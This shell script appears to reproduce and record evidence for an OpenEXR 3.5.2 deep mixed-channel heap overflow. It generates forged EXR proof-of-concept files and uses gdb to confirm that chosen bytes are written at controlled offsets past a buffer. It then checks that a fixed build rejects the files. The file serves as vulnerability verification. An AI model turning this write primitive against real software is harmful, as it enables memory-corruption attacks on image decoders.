#!/bin/sh
# W180: scaled-offset mixed-channel chosen-byte replay.
# The forged sample count N sizes the inner HALF block to 2N bytes; the
# pinned sink writes the file-chosen block at destination offset 4N.
# N=32/64/128 -> chosen bytes at unpacked_buffer+128/+256/+512.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-w180 evidence

# Build the baseline generator if this tree does not have it yet (same flags
# as build.sh and harness/mixed-check.sh).
if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi

bin-vuln-plain/gen_baseline_deep_mixed work-w180/baseline_deep_mixed.exr \
    > evidence/offset-gen.out
test "$(sha256sum work-w180/baseline_deep_mixed.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT

for n in 32 64 128; do
    size=$((2 * n))
    changed=$((4 * n))
    off=$((4 * n))
    case $n in
        32)
            h3c=484b1c35f66e18db3e263346e100da44a199e4bdf08c0678afe113b042593a52
            h5a=efb6bbd24d9b3c3165f75fe4c2da2f69f0de9ffabf8f3a6ccb6169f8a5af033b
            ;;
        64)
            h3c=41f840cbca092dd78c935e47e14b4149e3edac6c59f50de4ef186cd97aa106a6
            h5a=a0d8c88663031e50123af8fa6c814b4a13e7627f0ec5f318272d75bc955ce03b
            ;;
        128)
            h3c=38767b7ec757ff6b1b648f359df30c79b0d8e061bb81a155668bc737e3d201bc
            h5a=9f716aec359be8fc9c0c1e48edea2b21c0532d786939f7f437f4659c4b33b8f0
            ;;
    esac
    for byte in 3c 5a; do
        eval "want=\$h$byte"
        python3 cases/make_poc_mixed.py work-w180/baseline_deep_mixed.exr \
            "work-w180/poc_n${n}_${byte}.exr" "$n" "0x$byte" > /dev/null
        test "$(sha256sum "work-w180/poc_n${n}_${byte}.exr" | cut -d' ' -f1)" = "$want"
        ./bin-vuln-plain/guarded_harness "work-w180/poc_n${n}_${byte}.exr" 2>&1 \
            | awk '/^BUFFERS / {gsub(/0x[0-9a-f]+/, "ADDR")} {print}' \
            > "evidence/offset-vuln-n${n}-${byte}.out"
        grep -q 'DECODE rv=31' "evidence/offset-vuln-n${n}-${byte}.out"
        grep -q "GUARD-CHANGE alloc=24 size=$size changed=$changed" \
            "evidence/offset-vuln-n${n}-${byte}.out"
        grep -q "GUARD-TOTAL post-decode changed=$changed" \
            "evidence/offset-vuln-n${n}-${byte}.out"
        gdb -q -batch -ex 'break guarded_harness.c:137' \
            -ex "run work-w180/poc_n${n}_${byte}.exr" \
            -ex "x/8bx decode.unpacked_buffer+$off" \
            ./bin-vuln-plain/guarded_harness > "$RAW" 2>&1
        grep '^0x' "$RAW" | cut -d: -f2- > "evidence/offset-gdb-n${n}-${byte}.out"
        [ "$(grep -o "0x$byte" "evidence/offset-gdb-n${n}-${byte}.out" | wc -l)" -eq 8 ]
    done
    ./bin-fixed-asan/guarded_harness "work-w180/poc_n${n}_5a.exr" 2>&1 \
        | awk '/^BUFFERS / {gsub(/0x[0-9a-f]+/, "ADDR")} {print}' \
        > "evidence/offset-fixed-n${n}.out"
    grep -q 'DECODE rv=23' "evidence/offset-fixed-n${n}.out"
    grep -q 'GUARD-TOTAL post-decode changed=0' "evidence/offset-fixed-n${n}.out"
done

printf 'RESULT PASS\n'
sha256sum evidence/offset-*.out
